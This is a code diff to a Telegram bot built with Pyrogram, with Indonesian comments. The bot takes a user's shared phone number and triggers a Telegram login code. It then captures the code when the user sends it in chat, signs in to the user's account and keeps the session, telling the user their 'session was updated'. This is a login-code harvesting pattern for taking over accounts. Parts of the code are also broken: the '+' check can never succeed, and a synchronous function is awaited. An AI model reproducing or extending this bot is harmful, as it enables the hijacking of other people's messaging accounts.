@@ -10,13 +10,32 @@ from pyrogram.errors import SessionPasswordNeeded
 from pyrogram.session import Session
 
 
+def fix_phone_number(phone_number):
+    # Menghilangkan karakter selain digit
+    phone_number = "".join(filter(str.isdigit, phone_number))
+
+    # Menghilangkan angka 0 pada awal nomor telepon
+    if phone_number.startswith("0"):
+        phone_number = phone_number[1:]
+
+    # Menambahkan awalan internasional jika tidak ada
+    if not phone_number.startswith("+"):
+        phone_number = "+62" + phone_number
+
+    return phone_number
+
+# Fungsi untuk membuat session
 def create_session(phone_number):
     # Membuat session menggunakan nomor telepon pengguna
     with app:
         try:
             app.send_code(phone_number)
             # Meminta kode verifikasi
-            code = input("Masukkan kode verifikasi yang Anda terima: ")
+            code = None
+            while code is None:
+                message = app.listen(filters.private & filters.regex(r"^\d{4,6}$"))
+                code = message.text
+
             session = app.sign_in(phone_number, code)
 
         # Jika dibutuhkan password tambahan
@@ -27,12 +46,6 @@ def create_session(phone_number):
     # Mengembalikan session
     return session
 
-# Fungsi untuk mengirimkan pesan dengan menunggu balasan dari pengguna
-async def send_message_and_get_reply(chat_id, text):
-    message = await app.send_message(chat_id, text)
-    reply = await app.listen(filters.reply & filters.text)
-    return reply.text
-
 # Handler untuk menerima pesan dari pengguna
 @app.on_message(filters.private)
 async def handle_message(client, message):
@@ -40,6 +53,9 @@ async def handle_message(client, message):
     if message.contact is not None:
         # Mengambil nomor telepon dari pesan
         phone_number = message.contact.phone_number
+
+        # Memperbaiki nomor telepon
+        phone_number = fix_phone_number(phone_number)
 
         # Membuat session menggunakan nomor telepon
         session = await create_session(phone_number)
@@ -61,11 +77,6 @@ async def handle_message(client, message):
 
         # Mengirimkan pesan berhasil memperbarui session
         await app.send_message(message.chat.id, "Session berhasil diperbarui!")
-
-    # Jika pengguna mengirimkan pesan lain
-    else:
-        # Mengirimkan pesan meminta nomor telepon
-        await app.send_message(message.chat.id, "Silakan kirimkan nomor telepon Anda menggunakan tombol 'Kirim Kontak' di bawah ini.", reply_markup={"keyboard": [[{"text": "Kirim Kontak", "request_contact": True}]], "resize_keyboard": True})
     
 # Jalankan bot
 app.run()
